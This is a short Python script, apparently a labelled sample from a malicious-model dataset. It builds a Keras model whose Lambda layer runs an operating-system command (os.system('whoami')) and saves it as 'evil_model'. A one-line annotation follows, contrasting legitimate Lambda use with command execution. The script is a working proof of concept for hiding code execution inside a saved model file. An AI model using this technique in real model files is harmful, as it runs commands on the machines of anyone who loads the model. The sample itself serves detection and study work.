import tensorflow
def exploit(x):
    import os
    os.system("whoami")
    return x
model = tensorflow.keras.Sequential()
model.add(tensorflow.keras.layers.Input(shape=(64,)))
model.add(tensorflow.keras.layers.Lambda(exploit))
model.compile()
model.save("evil_model")

malice_analysis.similar_legitimate_use: Legitimate Lambda layers may use custom functions for mathematical operations, but never for system command execution or OS interaction.
